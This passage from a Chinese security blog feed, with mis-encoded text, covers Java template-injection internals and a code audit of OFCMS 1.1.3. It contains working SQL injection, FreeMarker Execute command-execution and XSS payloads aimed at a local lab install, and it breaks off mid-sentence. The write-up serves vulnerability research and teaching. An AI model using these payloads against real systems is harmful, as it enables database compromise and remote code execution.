Exception &#123;<br>        <span class="hljs-comment">//è·å–handler</span><br>        <span class="hljs-type">HandlerMethodReturnValueHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.selectHandler(returnValue, returnType);<br>        <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Unknown return value type: &quot;</span> + returnType.getParameterType().getName());<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//æ‰§è¡ŒhandleReturnValueæ“ä½œ</span><br>            handler.handleReturnValue(returnValue, returnType, mavContainer, webRequest);<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>ViewNameMethodReturnValueHandler#handleReturnValue</p><ul><li>åˆ¤æ–­è¿”å›å€¼ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦å‹ï¼Œè®¾ç½®<code>mavContainer.viewName</code></li><li>åˆ¤æ–­è¿”å›å€¼æ˜¯å¦ä»¥<code>redirect:</code>å¼€å¤´ï¼Œå¦‚æœæ˜¯çš„è¯åˆ™è®¾ç½®é‡å®šå‘çš„å±æ€§</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleReturnValue</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (returnValue <span class="hljs-keyword">instanceof</span> CharSequence) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">viewName</span> <span class="hljs-operator">=</span> returnValue.toString();<br>            <span class="hljs-comment">//è®¾ç½®è¿”å›å€¼ä¸ºviewName</span><br>            mavContainer.setViewName(viewName);<br>            <span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦éœ€è¦é‡å®šå‘</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.isRedirectViewName(viewName)) &#123;<br>                mavContainer.setRedirectModelScenario(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (returnValue != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>(<span class="hljs-string">&quot;Unexpected return type: &quot;</span> + returnType.getParameterType().getName() + <span class="hljs-string">&quot; in method: &quot;</span> + returnType.getMethod());<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡ä¸Šé¢çš„æ“ä½œï¼Œå°†è¿”å›å€¼è®¾ç½®ä¸º<code>mavContainer.viewName</code>,æ‰§è¡Œä¸Šè¿°æ“ä½œåè¿”å›åˆ°<code>RequestMappingHandlerAdapter#invokeHandlerMethod</code>ä¸­ã€‚é€šè¿‡<code>getModelAndView</code>è·å–<code>ModelAndView</code>å¯¹è±¡ã€‚</p><p><code>getModelAndView</code>æ ¹æ®<code>viewName</code>å’Œ<code>model</code>åˆ›å»º<code>ModelAndView</code>å¯¹è±¡å¹¶è¿”å›ã€‚</p><p><img src="/img/ssti(java)/ssti44.png"></p><h4 id="View-Resolver-ä¸æ‰§è¡Œæ¨¡æ¿æ¸²æŸ“"><a href="#View-Resolver-ä¸æ‰§è¡Œæ¨¡æ¿æ¸²æŸ“" class="headerlink" title="View Resolver ä¸æ‰§è¡Œæ¨¡æ¿æ¸²æŸ“"></a>View Resolver ä¸æ‰§è¡Œæ¨¡æ¿æ¸²æŸ“</h4><p>è·å–<code>ModelAndView</code>åï¼Œé€šè¿‡<code>DispatcherServlet#render</code>è·å–è§†å›¾è§£æå™¨å¹¶æ¸²æŸ“ã€‚</p><p>çœ‹åˆ°712è¡Œå¼•ç”¨è‡ªå·±çš„æ¨¡æ¿å¼•æ“æ¸²æŸ“</p><p><img src="/img/ssti(java)/ssti45.png"></p><p>è·³è½¬åˆ°æ¨¡æ¿çš„renderæ–¹æ³•</p><p><img src="/img/ssti(java)/ssti46.png"></p><p>å› ä¸ºæˆ‘ä»¬ç”¨çš„æ˜¯ Thymeleaf æ¨¡ç‰ˆå¼•æ“ï¼Œæ‰€ä»¥ view.render æ‰¾åˆ°å¯¹åº”çš„è§†å›¾ <strong>ThymeleafView çš„ render æ–¹æ³•</strong>è¿›è¡Œæ¸²æŸ“ã€‚</p><p>ThymeleafView çš„ render æ–¹æ³•åˆè°ƒç”¨ <strong>renderFragment</strong> æ–¹æ³•è¿›è¡Œè§†å›¾æ¸²æŸ“ï¼Œæ¸²æŸ“å®Œæˆä¹‹åï¼ŒDispatcherServlet å°±å¯ä»¥å°†ç»“æœè¿”å›ç»™æˆ‘ä»¬äº†ã€‚</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><ol><li>åŠ¨æ€è°ƒè¯•ä¸€èˆ¬é€‚ç”¨äºåå¤æŸ¥çœ‹æ¼æ´å…³é”®ç‚¹ä¸åŒçš„å‚æ•°æƒ…å†µä»¥åŠä¼ å‚è¿‡ç¨‹ï¼Œä»£ç æ‰§è¡Œæƒ…å†µè°ƒç”¨çš„å‡½æ•°ç­‰ä¸€äº›æ¯”è¾ƒå¤§çš„æ–¹å‘çœ‹è°ƒç”¨æ ˆå³å¯ï¼Œä¸€æ­¥æ­¥è°ƒè¯•å¾ˆå®¹æ˜“ä¹±</li></ol><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><ol><li><p>ä¸‰ä¸ªæ¨¡æ¿æ¼æ´éƒ½æ˜¯åœ¨æ¸²æŸ“ä»£ç ä¸­è§¦å‘æ¼æ´ï¼Œèµ°å…¥å¯¹åº”çš„renderæ¸²æŸ“æ–¹æ³•å¼€å§‹ï¼Œæœ€ç»ˆèµ°åˆ°Methodç±»çš„invokeæ–¹æ³•åˆ©ç”¨javaåå°„è°ƒç”¨runtime(æˆ–å…¶ä»–)æ–¹æ³•æ‰§è¡Œexecå‘½ä»¤åç»“æŸ</p></li><li><p>å°†é…ç½®çš„æ‹¦æˆªå™¨åŠ å…¥åˆ°æ‰§è¡Œé“¾ä¸­å»ï¼Œåœ¨<strong>getHandlerExecutionChain</strong> æ–¹æ³•</p></li><li><p>åˆ†ææºç çœŸçš„å¾ˆéœ€è¦è€å¿ƒï¼Œå¾—ä¸€æ­¥æ­¥æ…¢æ…¢è°ƒè¯•æ‰èƒ½è¿›å…¥å…³é”®å‡½æ•°</p></li></ol><p>å‚è€ƒï¼š</p><ul><li><a href="https://www.cnblogs.com/LittleHann/p/17846825.html#_lab2_0_4">Javaæ¨¡ç‰ˆå¼•æ“æ³¨å…¥ï¼ˆSSTIï¼‰æ¼æ´ç ”ç©¶ - éƒ‘ç€š - åšå®¢å›­ (cnblogs.com)</a></li><li><a href="https://drun1baby.top/2022/11/07/Java-OWASP-SSTI-%E5%AD%A6%E4%B9%A0">Java OWASP SSTI å­¦ä¹  | Drunkbabyâ€™s Blog (drun1baby.top)</a></li><li><a href="https://garck3h.github.io/2023/07/03/velocity%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#evaluate%E8%A7%A6%E5%8F%91">velocityçš„SSTIå¤ç°ä¸åˆ†æ (garck3h.github.io)</a></li><li><a href="https://www.cnpanda.net/sec/1063.html">Thymeleaf SSTI åˆ†æä»¥åŠæœ€æ–°ç‰ˆä¿®å¤çš„ Bypass - Panda | çƒ­çˆ±å®‰å…¨çš„ç†æƒ³å°‘å¹´ (cnpanda.net)</a></li><li><a href="https://xz.aliyun.com/news/9962">Thymeleaf SSTIæ¼æ´åˆ†æ-å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></li><li><a href="https://segmentfault.com/a/1190000021848063#item-2-3">spring-mvc - æ·±å…¥æºç åˆ†æSpringMVCæ‰§è¡Œè¿‡ç¨‹ - åç«¯æŠ€æœ¯ç¤¾åŒº - SegmentFault æ€å¦</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OFCMS 1.1.3 ä»£ç å®¡è®¡(Java)</title>
    <link href="/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/"/>
    <url>/2025/07/13/OFCMS%201.1.3%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(Java)/</url>
    
    <content type="html"><![CDATA[<h2 id="OFCMS-1-1-3-ä»£ç å®¡è®¡-Java"><a href="#OFCMS-1-1-3-ä»£ç å®¡è®¡-Java" class="headerlink" title="OFCMS 1.1.3 ä»£ç å®¡è®¡(Java)"></a>OFCMS 1.1.3 ä»£ç å®¡è®¡(Java)</h2><p>å‚è€ƒæ–‡ç« ï¼š</p><ul><li><a href="https://blog.csdn.net/YouthBelief/article/details/122978328">ã€Javaä»£ç å®¡è®¡ã€‘OFCMS 1.1.3 å®¡è®¡_ofcms-v1.1.3 idea-CSDNåšå®¢</a></li><li><a href="https://forum.butian.net/share/1229">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-è®°åˆä¸€æ¬¡Javaä»£ç å®¡è®¡ (butian.net)</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Javaå®‰å…¨ä¹‹freemarker æ¨¡æ¿æ³¨å…¥ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></li><li>[ã€Javaä»£ç å®¡è®¡ã€‘ofcms 1.1.3 | Fançš„å°é…’é¦† (fanygit.github.io)](<a href="https://fanygit.github.io/2022/10/09/[Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1]ofcms">https://fanygit.github.io/2022/10/09/[Javaä»£ç å®¡è®¡]ofcms</a> 1.1.3&#x2F;)</li></ul><h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>é¡¹ç›®åœ°å€ï¼š<a href="https://gitee.com/oufu/ofcms/tree/V1.1.3/">https://gitee.com/oufu/ofcms/tree/V1.1.3/</a></p><p>åœ¨IDEAä¸­æ‰“å¼€é¡¹ç›®åï¼Œæ·»åŠ ä¸€ä¸ªtomcatæœåŠ¡å™¨</p><p><img src="/img/ofcms/ofcms01.png"></p><p>éƒ¨ç½²å·¥ä»¶</p><p><img src="/img/ofcms/ofcms02.png"></p><p>ç­‰å¾…mavené…ç½®åæ‰“å¼€ç½‘ç«™</p><p>è‡ªåŠ¨å®‰è£…æŠ¥é”™</p><p><img src="/img/ofcms/ofcms03.png"></p><p>å¼€å§‹æ‰‹åŠ¨å®‰è£…</p><p>é¦–å…ˆåœ¨MySQLä¸­åˆ›å»ºç©ºçš„ofcmsæ•°æ®åº“ï¼Œç„¶åå°† <code>ofcms-V1.1.3/doc/sql/ofcms-v1.1.3.sql</code>æ–‡ä»¶å¯¼å…¥åˆ°è‡ªå·±åˆ›å»ºçš„æ•°æ®åº“ä¸­(è¿è¡Œsqlæ–‡ä»¶)</p><p>å°†æ•°æ®åº“é…ç½®æ–‡ä»¶<code>ofcms-V1.1.3/ofcms-admin/src/main/resources/dev/conf/db-config.properties</code>æ–‡ä»¶åä¿®æ”¹ä¸º<code>db.properties</code>ï¼Œç„¶åä¿®æ”¹æ–‡ä»¶ä¸­çš„æ•°æ®åº“é…ç½®ä¿¡æ¯</p><p><img src="/img/ofcms/ofcms04.png"></p><p>å¯åŠ¨é¡¹ç›®ï¼Œè®¿é—®ç¨‹åºåå°åœ°å€ï¼š<br><code>http://localhost:8080/ofcms_admin_war/admin/index.html</code></p><p>é»˜è®¤è´¦å·å’Œå¯†ç ï¼šadmin&#x2F;123456</p><p>æˆåŠŸç™»å½•</p><h3 id="å®¡è®¡è¿‡ç¨‹"><a href="#å®¡è®¡è¿‡ç¨‹" class="headerlink" title="å®¡è®¡è¿‡ç¨‹"></a>å®¡è®¡è¿‡ç¨‹</h3><ul><li><p>å…ˆçœ‹pom.xmlæ–‡ä»¶ï¼Œå…³æ³¨å¼•å…¥çš„ä¾èµ–</p><p>æ­¤cmså¼•å…¥äº†log4jçš„ä¾èµ–ï¼Œä¹‹åå¯ä»¥å…³æ³¨ä¸€ä¸‹æœ‰æ— åˆ©ç”¨ç‚¹</p></li><li><p>æ‰“å¼€ç½‘ç«™æ—¶åœ¨è½¯ä»¶ä»‹ç»å¤„å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯mybatisï¼Œfreemarkeræ¨¡æ¿ï¼Œshiroå®‰å…¨æ¡†æ¶ï¼Œmysqlæ•°æ®åº“</p></li><li><p>ç¿»çœ‹ç›®å½•ç»“æ„åˆ¤æ–­æ§åˆ¶åå°ç™»å½•çš„æ ¸å¿ƒä»£ç å¤§æ¦‚éƒ½åœ¨ofcms-adminå†…</p></li><li><p>æœç´¢å…³é”®å­—é€ä¸ªæ’æŸ¥æ¼æ´(ç™½ç›’)+åœ¨ç½‘é¡µå¯»æ‰¾åŠŸèƒ½ç‚¹æµ‹è¯•(é»‘ç›’)</p></li></ul><p>ç™½ç›’å®¡è®¡æ—¶ç›´æ¥ä½¿ç”¨å·¥å…·SAST(æœç´¢å…³é”®å­—)ï¼Œçœå»é€ä¸ªæœç´¢å…³é”®å­—çš„æ—¶é—´</p><p><img src="/img/ofcms/ofcms05.png"></p><p>é€ä¸ªæ’æŸ¥é«˜å±ä¸ä¸­å±æ¼æ´ï¼Œä¸ç½‘é¡µåŠŸèƒ½ç‚¹å¯¹åº”</p><h4 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h4><p>å·¥å…·å®¡å‡ºçš„ç¬¬ä¸€æ¡sqlæ³¨å…¥æ¼æ´å›åˆ°æºä»£ç ä¸­æ‰¾åˆ°å¯¹åº”ç‚¹</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;system&#x2F;SystemGenerateController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> getPara(<span class="hljs-string">&quot;sql&quot;</span>);<br>Db.update(sql);<br>rendSuccessJson();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>rendFailedJson(ErrorCode.get(<span class="hljs-string">&quot;9999&quot;</span>), e.getMessage());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°create()æ–¹æ³•æ¥æ”¶äº†ç”¨æˆ·è¾“å…¥çš„ä¸€æ¡sqlè¯­å¥ï¼Œå¹¶ä¸”æ— è¿‡æ»¤</p><p>è¿½è¸ªgetParaæ–¹æ³•å‘ç°ï¼Œæ­¤æ–¹æ³•åªæ˜¯æ¥æ”¶å‚æ•°ï¼Œæ— è¿‡æ»¤</p><p>è¿½è¸ªDb.updateæ–¹æ³•ï¼Œä¸€ç›´è¿½è¸ªåˆ°</p><p>jfinal&#x2F;jfinal&#x2F;3.2&#x2F;jfinal-3.2.jar!&#x2F;com&#x2F;jfinal&#x2F;plugin&#x2F;activerecord&#x2F;DbPro.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-title function_">update</span><span class="hljs-params">(Config config, Connection conn, String sql, Object... paras)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>        <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pst</span> <span class="hljs-operator">=</span> conn.prepareStatement(sql);<br>        config.dialect.fillStatement(pst, paras);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> pst.executeUpdate();<br>        DbKit.close(pst);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æ‰§è¡Œäº†ä¼ å…¥çš„sqlè¯­å¥</p><p>è™½ç„¶æ­¤æ–¹æ³•åˆ›å»ºé¢„ç¼–è¯‘çš„ SQL è¯­å¥å¯¹è±¡ <code>pst</code>ï¼Œä½†æ˜¯å¹¶æœªä½¿ç”¨é¢„ç¼–è¯‘å†™æ³•(å ä½ç¬¦ï¼Œå›ºå®šsqlè¯­å¥)ï¼Œè€Œæ˜¯å°†ä¼ å…¥çš„sqlè¯­å¥ç›´æ¥ä½œä¸ºä¸€ä¸ªå‚æ•°æ‰§è¡Œ</p><p>åˆ¤æ–­æ­¤å¤„å­˜åœ¨sqlæ³¨å…¥</p><p>åœ¨ç½‘é¡µå¯»æ‰¾åŠŸèƒ½ç‚¹ï¼š</p><p>ç”±äºæ­¤æ®µä»£ç åœ¨adminæ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ¤æ–­ä¸ºåå°åŠŸèƒ½ç‚¹</p><p>åœ¨åå°ç³»ç»Ÿè®¾ç½®-&gt;ä»£ç ç”Ÿæˆ-&gt;å¢åŠ -&gt;è¾“å…¥sql</p><p>æµ‹è¯•åå‘ç°èƒ½å¤ŸæŠ¥é”™ï¼Œå°è¯•æŠ¥é”™æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">update of_cms_link set link_name=updatexml(1,concat(0x7e,(user())),0) where link_id = 4<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ³¨å…¥</p><p><img src="/img/ofcms/ofcms06.png"></p><p>æ³¨ï¼š</p><p>åˆšåˆšå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†æ–¹æ³•<mark>PreparedStatement.executeUpdate()</mark></p><p><code>executeUpdate()</code> é€‚ç”¨äºæ‰§è¡Œï¼š</p><ul><li><code>INSERT</code></li><li><code>UPDATE</code></li><li><code>DELETE</code></li><li><code>CREATE</code>, <code>DROP</code>, <code>ALTER</code> ç­‰ DDL è¯­å¥</li></ul><p>payloadæ„é€ åº”è¯¥ä½¿ç”¨è¿™äº›è¯­å¥</p><h4 id="SSTIæ¨¡æ¿æ³¨å…¥"><a href="#SSTIæ¨¡æ¿æ³¨å…¥" class="headerlink" title="SSTIæ¨¡æ¿æ³¨å…¥"></a>SSTIæ¨¡æ¿æ³¨å…¥</h4><p>åœ¨ä¸€å¼€å§‹æŸ¥çœ‹è½¯ä»¶è¯´æ˜æ—¶å°±å¯ä»¥äº†è§£åˆ°æ­¤æºä»£ç ä½¿ç”¨äº†freemarkeræ¨¡æ¿å¼•æ“</p><p>åœ¨ç½‘é¡µåå°æŸ¥çœ‹åŠŸèƒ½ç‚¹æ—¶çœ‹åˆ°ä¿®æ”¹æ¨¡æ¿æ–‡ä»¶çš„åŠŸèƒ½</p><p><img src="/img/ofcms/ofcms07.png"></p><p>åœ¨æºä»£ç ä¸­å®šä½æ§åˆ¶ä»£ç </p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;cms&#x2F;TemplateController.java</p><p>saveæ–¹æ³•</p><p><img src="/img/ofcms/ofcms08.png"></p><p>å¯ä»¥çœ‹åˆ°å¯¹æ¨¡æ¿å†…å®¹æ§åˆ¶çš„ä»£ç åªæœ‰æ¡†èµ·æ¥çš„ä¸¤è¡Œï¼Œä¸‹é¢ç›´æ¥ä½¿ç”¨writeStringæ–¹æ³•å†™å…¥å¹¶æ‰§è¡Œ</p><p>è¿½è¸ªçº¢æ¡†ä¸­è°ƒç”¨çš„getRequest()ä¸getParameter()æ–¹æ³•ï¼Œå‘ç°æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p>åœ¨ç½‘ä¸ŠæŸ¥æ‰¾freemarkeræ¨¡æ¿sstiæ³¨å…¥åˆ©ç”¨</p><p><a href="https://www.cnblogs.com/nice0e3/p/16217471.html#api">Javaå®‰å…¨ä¹‹freemarker æ¨¡æ¿æ³¨å…¥ - nice_0e3 - åšå®¢å›­ (cnblogs.com)</a></p><p>payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; <br>  $&#123; ex(&quot;calc&quot;) &#125;<br></code></pre></td></tr></table></figure><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæˆ‘çš„åªæœ‰è¿™ä¸ªpayloadæ˜¯å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨çš„ï¼Œå¯ä»¥å°è¯•å¤šç§payload</p><p><img src="/img/ofcms/ofcms09.png"></p><h4 id="å‰å°å­˜å‚¨å‹xss"><a href="#å‰å°å­˜å‚¨å‹xss" class="headerlink" title="å‰å°å­˜å‚¨å‹xss"></a>å‰å°å­˜å‚¨å‹xss</h4><p>åœ¨ç½‘é¡µå¯»æ‰¾åŠŸèƒ½ç‚¹æ—¶çœ‹åˆ°å‰å°æ–°é—»é¡µé¢æœ‰è¯„è®ºåŠŸèƒ½</p><p>å‘è¡¨è¯„è®ºé€šè¿‡å¼€å‘è€…å·¥å…·-&gt;ç½‘ç»œåŠŸèƒ½ï¼ŒæŸ¥çœ‹æ¶ˆæ¯å¤´ï¼Œåˆ¤æ–­æ§åˆ¶æ­¤åŠŸèƒ½çš„ä»£ç ä½ç½®</p><p><img src="/img/ofcms/ofcms10.png"></p><p>åœ¨æºç ä¸­æŸ¥æ‰¾</p><p>ofcms-api&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F; <mark>api&#x2F;v1&#x2F;CommentApi.java</mark></p><p>saveæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// è·å–è¯·æ±‚å‚æ•°</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">params</span> <span class="hljs-operator">=</span> getParamsMap();<br>        <span class="hljs-comment">// è·å–ç”¨æˆ·çœŸå® IP åœ°å€ï¼Œå¹¶æ·»åŠ åˆ°å‚æ•°ä¸­</span><br>        params.put(<span class="hljs-string">&quot;comment_ip&quot;</span>, IpKit.getRealIp(getRequest()));<br>        <span class="hljs-comment">// è°ƒç”¨ SQL æ¨¡æ¿ &quot;cms.comment.save&quot; å¹¶æ‰§è¡Œæ›´æ–°æ“ä½œï¼ˆæ’å…¥è¯„è®ºï¼‰</span><br>        Db.update(Db.getSqlPara(<span class="hljs-string">&quot;cms.comment.save&quot;</span>, params));<br>        <span class="hljs-comment">// è¿”å›æˆåŠŸçš„ JSON å“åº”</span><br>        rendSuccessJson();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// å¦‚æœå‡ºç°å¼‚å¸¸ï¼Œæ‰“å°å †æ ˆä¿¡æ¯</span><br>        e.printStackTrace();<br>        <span class="hljs-comment">// è¿”å›å¤±è´¥çš„ JSON å“åº”</span><br>        rendFailedJson();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿½è¸ªgetSqlParaå‡½æ•°å¹¶æœªå‘ç°è¿‡æ»¤ï¼Œæ­¤æ®µä»£ç åªæ˜¯ç›´æ¥è·å–è¯„è®ºå†…å®¹éšååœ¨æ•°æ®åº“ä¸­æ›´æ–°</p><p>ä½¿ç”¨xss payloadï¼š<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>æµ‹è¯•</p><p>çœ‹åˆ°å…¶ä»–å¸ˆå‚…çš„æµ‹è¯•æ˜¯å¯ä»¥æ­£å¸¸å¼¹çª—çš„ï¼Œæˆ‘çš„æœ‰404æŠ¥é”™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p><img src="/img/ofcms/ofcms11.png"></p><p>åœ¨åå°ç›´æ¥ç¼–è¾‘è¯„è®ºæ˜¯å¯ä»¥æ­£å¸¸å¼¹çª—çš„</p><h4 id="åå°æ–‡ä»¶ä¸Šä¼ 01"><a href="#åå°æ–‡ä»¶ä¸Šä¼ 01" class="headerlink" title="åå°æ–‡ä»¶ä¸Šä¼ 01"></a>åå°æ–‡ä»¶ä¸Šä¼ 01</h4><p>åœ¨ç½‘ç«™å¯»æ‰¾åŠŸèƒ½ç‚¹æ‰¾åˆ°æ–‡ä»¶ä¸Šä¼ </p><p>å†…å®¹ç®¡ç†-&gt;æ ç›®ç®¡ç†-&gt;å…³äºæˆ‘ä»¬-&gt;ç¼–è¾‘-&gt;æ ç›®å›¾ä¸Šä¼ </p><p>æŠ“å–æ•°æ®åŒ…</p><p><img src="/img/ofcms/ofcms12.png"></p><p>æ‰¾åˆ°è·¯ç”±&#x2F;ofcms_admin_war&#x2F;admin&#x2F;comn&#x2F;service&#x2F;upload.js</p><p>å…¨å±€æœç´¢&#x2F;comn&#x2F;service&#x2F;</p><p>åœ¨æºç ä¸­å®šä½</p><p>ofcms-admin&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;ofsoft&#x2F;cms&#x2F;admin&#x2F;controller&#x2F;ComnController.java</p><p>uploadæ–¹æ³•</p><p><img src="/img/ofcms/ofcms13.png"></p><p>åœ¨æ­¤å¤„ä¸‹æ–­ç‚¹è¿›è¡Œè°ƒè¯•</p><p>getFileæ–¹æ³•-&gt;getFilesæ–¹æ³•-&gt;MultipartRequestç±»-&gt;wrapMultipartRequestæ–¹æ³•-&gt;isSafeFileæ–¹æ³•</p><p>getFilesæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;UploadFile&gt; <span class="hljs-title function_">getFiles</span><span class="hljs-params">(String uploadPath)</span> &#123;<br>    <span class="hljs-comment">// å¦‚æœå½“å‰è¯·æ±‚ä¸æ˜¯ MultipartRequest ç±»å‹ï¼ˆå³éæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼‰</span><br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-built_in">this</span>.request <span class="hljs-keyword">instanceof</span> MultipartRequest)) &#123;<br>        <span class="hljs-comment">// å°†å½“å‰è¯·æ±‚è½¬æ¢ä¸º MultipartRequestï¼Œå¹¶æŒ‡å®šæ–‡ä»¶ä¸Šä¼ çš„ä¿å­˜è·¯å¾„</span><br>        <span class="hljs-built_in">this</span>.request = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MultipartRequest</span>(<span class="hljs-built_in">this</span>.request, uploadPath);<br>    &#125;<br>    <span class="hljs-comment">// å°†è¯·æ±‚å¼ºåˆ¶è½¬æ¢ä¸º MultipartRequestï¼Œå¹¶è·å–ä¸Šä¼ çš„æ–‡ä»¶åˆ—è¡¨</span><br>    <span class="hljs-keyword">return</span> ((MultipartRequest)<span class="hljs-built_in">this</span>.request).getFiles();<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•çš„ä½œç”¨æ˜¯è·å–ä¸Šä¼ çš„æ–‡ä»¶åˆ—è¡¨ï¼Œå…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š<br>  1.åˆ¤æ–­å½“å‰è¯·æ±‚æ˜¯å¦ä¸ºæ–‡ä»¶ä¸Šä¼ ç±»å‹ï¼ˆMultipartRequestï¼‰ï¼›<br>  